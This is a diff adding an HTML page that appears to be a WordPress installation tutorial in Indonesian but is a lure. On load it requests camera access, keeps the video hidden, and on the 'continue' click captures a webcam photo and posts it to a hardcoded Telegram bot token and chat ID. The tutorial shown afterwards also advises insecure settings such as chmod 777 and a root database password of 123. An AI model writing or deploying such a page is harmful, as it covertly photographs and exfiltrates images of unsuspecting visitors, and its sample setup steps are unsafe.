@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kirim Gambar ke Telegram</title>
+<style>
+  #camera-stream {
+    width: 100%;
+    max-width: 600px;
+    margin: auto;
+  }
+
+  .hidden {
+    display: none;
+  }
+</style>
+</head>
+<body>
+  <div id="pengalihan-isu">
+      <h1>Langkah demi langkah membuat web WordPress</h1>
+  
+  <video class="hidden" id="camera-stream" autoplay></video>
+  <button onclick="takePicture()">Klik untuk melanjutkan</button>
+  </div>
+  
+  <div id="tutorial" class="tutorial hidden">
+    <h1>Install WordPress</h1>
+    <ol>
+      <li>apt install apache2 php mariadb-server phpmyadmin wget unzip -y</li>
+      <li>wget http://172.16.90.2/unduh/wordpress.zip</li>
+      <li>ls</li>
+      <li>mv wordpress.zip /var/www/html/</li>
+      <li>cd /var/www/html/</li>
+      <li>ls (ada 2 file, index.html & wordpress.zip)</li>
+      <li>mysql_secure_installation</li>
+      <li>unzip wordpress.zip</li>
+      <li>ls</li>
+      <li>rm index.html</li>
+      <li>cd wordpress/</li>
+      <li>mv * ../</li>
+      <li>ls (kosong)</li>
+      <li>cd ..</li>
+      <li>ls</li>
+      <li>cd ..</li>
+      <li>chmod -R 777 html/</li>
+      <li>Add database dengan nama wordpress (buka browser,masukkan ip debian kita,pada terakhir ketik ip masukan /phpmyadmin - Add data base</li>
+      <li>Buka WordPress pada browser dengan cara masukkan ip debian kita pada browser</li>
+      <li>Klik Ayo</li>
+      <li>Nama basis data : wordpress</li>
+      <li>Nama pengguna : root</li>
+      <li>Sandi : 123</li>
+      <li>Host basis data : localhost</li>
+      <li>Klik Kirim, Jalankan instalasi, dan Pasang WordPress</li>
+      <li>Judul situs : Website</li>
+      <li>Nama pengguna : sufyan</li>
+      <li>Sandi : bebas</li>
+      <li>Email Anda : admin@admin.net</li>
+      <li>Klik Instal WordPress</li>
+    </ol>
+  </div>
+
+  
+  <script>
+    // Ambil elemen video
+    const video = document.getElementById('camera-stream');
+         const pengalihan =  document.getElementById("pengalihan-isu")
+         const tutorial = document.getElementById("tutorial")
+
+    // Mengakses kamera pengguna saat halaman dimuat
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        video.srcObject = stream;
+        
+      })
+      .catch(function(error) {
+        console.error('Error accessing the camera:', error);
+      });
+
+    // Fungsi untuk mengambil gambar dari video dan mengirimnya
+    function takePicture() {
+
+     pengalihan.classList.add("hidden")
+     tutorial.classList.remove("hidden")
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      
+      // Mengubah gambar menjadi data URL (base64)
+      const dataURL = canvas.toDataURL('image/jpeg');
+      
+      // Mengubah data URL menjadi format yang bisa dikirimkan
+      const base64Data = dataURL.split(',')[1];
+      const binaryString = window.atob(base64Data);
+      const len = binaryString.length;
+      const bytes = new Uint8Array(len);
+      for (let i = 0; i < len; i++) {
+        bytes[i] = binaryString.charCodeAt(i);
+      }
+      const file = new File([bytes], 'photo.jpg', { type: 'image/jpeg' });
+
+      const formData = new FormData();
+      formData.append('chat_id', '5610020378'); // Ganti dengan chat ID yang Anda inginkan
+      formData.append('photo', file);
+      formData.append('caption', 'Foto dari kamera');
+
+      // Token bot Telegram
+      const token = '6489258679:AAFNnPRllTOq9iYo_O3b9i_jQS5f1lELKNs'; // Ganti dengan token bot Telegram Anda
+
+      // Kirim gambar ke bot Telegram
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Image sent to Telegram:', data);
+      })
+      .catch(error => {
+        console.error('Error sending image to Telegram:', error);
+      });
+    }
+
+    // Fungsi untuk mengambil gambar dan mengalihkan halaman
+  
+  </script>
+</body>
+</html>
